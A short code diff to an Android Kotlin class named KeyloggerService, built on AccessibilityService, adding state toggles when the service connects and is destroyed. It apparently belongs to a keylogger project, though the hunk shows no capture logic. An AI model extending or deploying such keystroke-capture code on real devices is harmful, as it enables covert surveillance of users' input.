@@ -64,6 +64,12 @@ class KeyloggerService: AccessibilityService() {
     }
 
     override fun onServiceConnected() {
+        KeyloggerState.enabled()
         super.onServiceConnected()
+    }
+
+    override fun onDestroy() {
+        KeyloggerState.disable()
+        super.onDestroy()
     }
 }
